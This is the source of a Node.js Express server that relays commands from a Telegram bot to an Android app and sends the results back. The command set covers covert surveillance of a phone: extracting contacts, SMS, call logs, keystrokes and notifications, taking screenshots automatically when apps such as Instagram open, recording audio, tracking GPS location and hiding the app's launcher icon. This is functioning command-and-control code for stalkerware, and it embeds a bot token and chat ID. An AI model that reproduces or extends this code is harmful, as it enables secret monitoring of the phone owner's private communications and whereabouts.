const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

// Your bot token from @BotFather
const BOT_TOKEN = process.env.BOT_TOKEN || '8566422839:AAGqOdw_Bru2TwF8_BDw6vDGRhwwr-RE2uo';
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Store authorized devices and their commands
const devices = new Map();

// Store authorized chat IDs
const authorizedChats = new Set([
    '5326373447', // Your chat ID
]);

// Middleware
app.use(express.json());

// ============= HELPER FUNCTIONS =============

function isAuthorizedChat(chatId) {
    return authorizedChats.has(String(chatId));
}

function sendJsonResponse(res, data, statusCode = 200) {
    try {
        res.status(statusCode).setHeader('Content-Type', 'application/json').send(JSON.stringify(data));
    } catch (e) {
        console.error('Error stringifying JSON:', e);
        res.status(500).json({ error: 'Internal server error' });
    }
}

// ============= TELEGRAM MESSAGE HELPERS =============

async function sendTelegramMessage(chatId, text) {
    try {
        if (!text || text.trim().length === 0) {
            console.error('❌ Attempted to send empty message');
            return null;
        }

        console.log(`📨 Sending message to ${chatId}: ${text.substring(0, 50)}...`);
        
        // Use HTML parse_mode which is more forgiving
        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML'
        });
        
        console.log(`✅ Message sent successfully to ${chatId}`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending message:', error.response?.data || error.message);
        
        // If HTML fails, try without formatting
        if (error.response?.status === 400) {
            console.log('⚠️ HTML failed, retrying as plain text');
            try {
                const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
                    chat_id: chatId,
                    text: text.replace(/<[^>]*>/g, '') // Strip HTML tags
                });
                return response.data;
            } catch (e) {
                console.error('❌ Plain text also failed:', e.response?.data || e.message);
            }
        }
        return null;
    }
}

// ============= COMMAND HELPERS =============

function getHelpMessage() {
    return `<b>🤖 COMPLETE COMMAND LIST</b>

<b>🔍 MONITORING COMMANDS</b>
/help - Get help 
/status - Get full device status
/location - Get current GPS location
/battery - Get battery level only
/storage - Get storage information
/network - Get network info (IP, WiFi, Mobile)

<b>📸 SCREENSHOT SIZE COMMANDS - SIMPLIFIED</b>
<b>▶️ THREE SIMPLE SIZE OPTIONS:</b>
/small - <b>SMALL SIZE</b> - Max compression, smallest files (~90% smaller)
       Quality: 30% | Resolution: 25% | Grayscale: ON | Color Reduction: ON
       <i>Perfect for quick previews, slow connections</i>

/medium - <b>MEDIUM SIZE</b> - Balanced quality/size (DEFAULT)
        Quality: 60% | Resolution: 50% | Format: WEBP
        <i>Best for daily use, good balance</i>

/original - <b>ORIGINAL SIZE</b> - Best quality, largest files
          Quality: 90% | Resolution: 100% | Format: JPEG
          <i>When quality matters most</i>

/size_status - Check current screenshot size setting

<b>📸 ADVANCED SCREENSHOT COMMANDS</b>
/screenshot - Take a screenshot NOW (with current size setting)
/screenshot_settings - View current screenshot settings
/auto_on - Enable auto-screenshot when apps open
/auto_off - Disable auto-screenshot
/auto_status - Check auto-screenshot settings

<b>🎤 RECORDING COMMANDS</b>
/record - Start 60s audio recording NOW
/stream_start - Start live streaming
/stream_stop - Stop live streaming

<b>📱 DATA EXTRACTION COMMANDS</b>
/contacts - Get contact list
/calllogs - Get recent call logs
/sms - Get recent SMS messages
/apps - List installed apps
/keystrokes - Get recent keystrokes
/notifications - Get recent notifications

<b>⚙️ SERVICE CONTROL COMMANDS</b>
/start_screenshot - Start screenshot SERVICE (continuous)
/stop_screenshot - Stop screenshot service
/start_recording - Start scheduled recording SERVICE
/stop_recording - Stop recording service
/start_stream - Start streaming service
/stop_stream - Stop streaming service

<b>🛠️ UTILITY COMMANDS</b>
/ping - Test connection
/time - Get device time
/info - Get detailed device info

<b>📊 STATS COMMANDS</b>
/logs_count - Get total log count
/logs_recent - Get 10 most recent logs
/stats - Get detailed statistics

<b>⚠️ DANGER COMMANDS</b>
/clear_logs - Clear all logs
/reboot_app - Restart all services
/hide_icon - Hide launcher icon
/show_icon - Show launcher icon

<b>📋 SIZE COMPARISON (1080p screenshot)</b>
• /small - ~20-50 KB - Fast transmission
• /medium - ~100-200 KB - Good balance
• /original - ~500 KB - 2 MB - Best quality

<b>📋 AUTO-SCREENSHOT EXAMPLES</b>
• /auto_on - Enable auto-screenshot
• /auto_interval 30 - Take screenshot every 30 seconds
• /auto_max 10 - Stop after 10 screenshots
• /add_target com.instagram.android - Monitor Instagram
• /target_apps - See all monitored apps

For more help, visit the dashboard at http://127.0.0.1:8080`;
}

// ============= WEBHOOK ENDPOINT =============

app.post('/webhook', async (req, res) => {
    // Send 200 OK immediately
    res.sendStatus(200);
    
    // Process asynchronously
    setImmediate(async () => {
        try {
            const update = req.body;
            console.log('📩 Received update:', JSON.stringify(update, null, 2));

            if (!update?.message) {
                console.log('📭 Non-message update');
                return;
            }

            const chatId = update.message.chat.id;
            const text = update.message.text;
            const messageId = update.message.message_id;

            // Check authorization
            if (!isAuthorizedChat(chatId)) {
                console.log(`⛔ Unauthorized chat: ${chatId}`);
                await sendTelegramMessage(chatId, '⛔ You are not authorized to use this bot.');
                return;
            }

            // Handle commands
            if (text?.startsWith('/')) {
                await handleCommand(chatId, text, messageId);
            }
        } catch (error) {
            console.error('❌ Error processing webhook:', error);
        }
    });
});

// ============= COMMAND HANDLER =============

async function handleCommand(chatId, command, messageId) {
    console.log(`\n🎯 Handling command: ${command} from chat ${chatId}`);
    console.log(`📊 Devices in memory: ${devices.size}`);

    // Handle help immediately - no device needed
    if (command === '/help' || command === '/start') {
        console.log('📋 Sending help menu directly from server');
        const helpMessage = getHelpMessage();
        await sendTelegramMessage(chatId, helpMessage);
        console.log('✅ Help menu sent');
        return;
    }

    // Find device for this chat
    let deviceId = null;
    let device = null;
    
    for (const [id, d] of devices.entries()) {
        if (String(d.chatId) === String(chatId)) {
            deviceId = id;
            device = d;
            console.log(`✅ Found device: ${deviceId}`);
            break;
        }
    }

    if (!deviceId) {
        console.log(`❌ No device found for chat ${chatId}`);
        await sendTelegramMessage(chatId, 
            '❌ No device registered.\n\nPlease make sure the Android app is running.');
        return;
    }

    // Update last seen
    device.lastSeen = Date.now();

    // Queue command for device (remove leading slash)
    const cleanCommand = command.startsWith('/') ? command.substring(1) : command;
    
    if (!device.pendingCommands) {
        device.pendingCommands = [];
    }
    
    const commandObject = {
        command: cleanCommand,
        originalCommand: command,
        messageId: messageId,
        timestamp: Date.now()
    };
    
    device.pendingCommands.push(commandObject);
    console.log(`📝 Command queued:`, commandObject);
    console.log(`📊 Pending commands: ${device.pendingCommands.length}`);

    // Acknowledge
    await sendTelegramMessage(chatId, `⏳ Processing: ${command}`);
}

// ============= API ENDPOINTS =============

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        devices: devices.size,
        authorizedChats: authorizedChats.size,
        timestamp: Date.now()
    });
});

// Ping endpoint for keep-alive
app.get('/api/ping/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    console.log(`💓 Ping from device ${deviceId}`);
    
    const device = devices.get(deviceId);
    
    if (device) {
        device.lastSeen = Date.now();
        res.json({ status: 'alive', timestamp: Date.now() });
    } else {
        res.status(404).json({ status: 'unknown' });
    }
});

// Get pending commands for device
app.get('/api/commands/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    try {
        if (device?.pendingCommands?.length > 0) {
            const commands = [...device.pendingCommands];
            device.pendingCommands = [];
            console.log(`📤 Sending ${commands.length} commands to ${deviceId}`);
            
            // Log the commands being sent
            commands.forEach(cmd => {
                console.log(`   └─ ${cmd.command}`);
            });
            
            sendJsonResponse(res, { commands });
        } else {
            sendJsonResponse(res, { commands: [] });
        }
    } catch (e) {
        console.error('Error in /api/commands:', e);
        sendJsonResponse(res, { commands: [], error: e.message }, 500);
    }
});

// Receive command result from device
app.post('/api/result/:deviceId', async (req, res) => {
    const deviceId = req.params.deviceId;
    const { command, result, error } = req.body;
    
    console.log(`📨 Result from ${deviceId}:`, { command, result, error });
    
    const device = devices.get(deviceId);
    if (device) {
        const chatId = device.chatId;
        
        // Format the message nicely
        let message;
        if (error) {
            message = `❌ <b>Command Failed</b>\n\n<code>${command}</code>\n\n<b>Error:</b> ${error}`;
        } else {
            // Check if result contains special formatting
            if (result.includes('SMALL') || result.includes('MEDIUM') || result.includes('ORIGINAL')) {
                // Size preset result - show with emoji
                message = `✅ <b>${result}</b>`;
            } else {
                message = `✅ <b>Command Executed</b>\n\n<code>${command}</code>\n\n${result}`;
            }
        }
        
        await sendTelegramMessage(chatId, message);
    }
    
    res.sendStatus(200);
});

// Register device
app.post('/api/register', async (req, res) => {
    const { deviceId, chatId, deviceInfo } = req.body;
    
    console.log('📝 Registration attempt:', { deviceId, chatId, deviceInfo });
    
    if (!deviceId || !chatId || !deviceInfo) {
        return res.status(400).json({ error: 'Missing fields' });
    }
    
    if (!isAuthorizedChat(chatId)) {
        console.log(`⛔ Unauthorized registration from chat: ${chatId}`);
        return res.status(403).json({ error: 'Chat ID not authorized' });
    }
    
    const deviceData = {
        chatId,
        deviceInfo,
        lastSeen: Date.now(),
        pendingCommands: []
    };
    
    devices.set(deviceId, deviceData);
    
    console.log(`✅ Device registered: ${deviceId} for chat ${chatId}`);
    console.log(`📊 Total devices: ${devices.size}`);
    
    // Send confirmation with size options
    await sendTelegramMessage(chatId, 
        `✅ <b>Device Connected!</b>\n\n` +
        `Model: ${deviceInfo.model}\n` +
        `Android: ${deviceInfo.android}\n` +
        `Battery: ${deviceInfo.battery}\n` +
        `ID: ${deviceId.substring(0, 8)}...\n\n` +
        `<b>📸 Screenshot Size Options:</b>\n` +
        `• /small - Max compression (20-50 KB)\n` +
        `• /medium - Balanced (100-200 KB)\n` +
        `• /original - Best quality (500 KB+)\n\n` +
        `Current: <b>MEDIUM</b> (default)`);
    
    res.json({ status: 'registered', deviceId });
});

// List all devices
app.get('/api/devices', (req, res) => {
    const deviceList = [];
    for (const [id, device] of devices.entries()) {
        deviceList.push({
            deviceId: id,
            chatId: device.chatId,
            lastSeen: new Date(device.lastSeen).toISOString(),
            model: device.deviceInfo?.model || 'Unknown',
            android: device.deviceInfo?.android || 'Unknown',
            pendingCommands: device.pendingCommands?.length || 0
        });
    }
    res.json({ total: devices.size, devices: deviceList });
});

// Debug endpoint
app.get('/api/debug/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    if (device) {
        res.json({
            deviceId,
            chatId: device.chatId,
            deviceInfo: device.deviceInfo,
            lastSeen: new Date(device.lastSeen).toISOString(),
            pendingCommands: device.pendingCommands || []
        });
    } else {
        res.json({ error: 'Device not found' });
    }
});

// Test endpoints
app.get('/test', (req, res) => {
    res.send(`
        <html>
        <body style="font-family: Arial; padding: 20px;">
            <h1 style="color: #4CAF50;">✅ Server Running</h1>
            <p><b>Time:</b> ${new Date().toISOString()}</p>
            <p><b>Devices:</b> ${devices.size}</p>
            <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
            <p><b>Available Commands:</b> /small, /medium, /original, /size_status, /screenshot, /status, /location</p>
            <p><a href="/test-help" style="background: #4CAF50; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Send Test Help</a></p>
            <p><a href="/test-small" style="background: #2196F3; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Test /small</a></p>
        </body>
        </html>
    `);
});

app.get('/test-help', async (req, res) => {
    const chatId = '5326373447';
    const helpMessage = getHelpMessage();
    const result = await sendTelegramMessage(chatId, helpMessage);
    res.json({ success: !!result, result });
});

app.get('/test-small', async (req, res) => {
    const chatId = '5326373447';
    const result = await sendTelegramMessage(chatId, 
        '✅ <b>Screenshot size set to: SMALL</b>\n\n' +
        '• Quality: 30%\n' +
        '• Resolution: 25%\n' +
        '• Grayscale: ON\n' +
        '• Color Reduction: ON\n\n' +
        'Estimated file size: 20-50 KB');
    res.json({ success: !!result, result });
});

// ============= START SERVER =============

app.listen(PORT, '0.0.0.0', () => {
    console.log('\n🚀 ===============================================');
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
    console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
    console.log('\n📸 NEW: Screenshot Size Commands:');
    console.log('   └─ /small     - Max compression (20-50 KB)');
    console.log('   └─ /medium    - Balanced (100-200 KB)');
    console.log('   └─ /original  - Best quality (500 KB+)');
    console.log('   └─ /size_status - Check current size');
    console.log('\n🚀 ===============================================\n');
});
